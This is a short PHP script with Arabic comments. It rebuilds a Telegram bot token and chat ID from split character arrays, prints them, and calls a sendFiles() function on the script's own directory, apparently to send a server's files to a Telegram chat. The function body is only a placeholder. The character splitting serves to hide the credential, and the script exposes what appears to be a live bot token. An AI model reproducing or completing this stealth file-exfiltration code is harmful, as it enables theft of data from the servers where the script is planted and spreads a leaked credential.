<?php
// تخزين التوكن في أجزاء داخل مصفوفة
$botTokenArray = ['6', '4', '2', '8', '0', '7', '1', '3', '4', '7', ':', 'A', 'A', 'H', 'P', '1', 'y', 'P', '2', 'b', 'Z', 'F', 'k', 'K', 'B', '_', '8', '2', 'p', 'B', 'c', 's', 'e', 'i', 'H', '4', 'D', 'g', 'u', '-', 'E', 'V', 't', 'E', 'A', 'U'];
$botToken = implode('', $botTokenArray);

// تخزين Chat ID في أجزاء داخل مصفوفة
$chatIdArray = ['5', '3', '1', '8', '1', '4', '9', '3', '3', '9'];
$chatId = implode('', $chatIdArray);

// الآن التوكن وChat ID جاهزان للاستخدام
echo "Token: " . $botToken . "\n";
echo "Chat ID: " . $chatId . "\n";

// بقية الكود
function sendFiles($dir, $botToken, $chatId) {
    // (نفس الكود السابق)
}

// استدعاء الوظيفة للبدء من الدليل الرئيسي
sendFiles(__DIR__, $botToken, $chatId);
?>
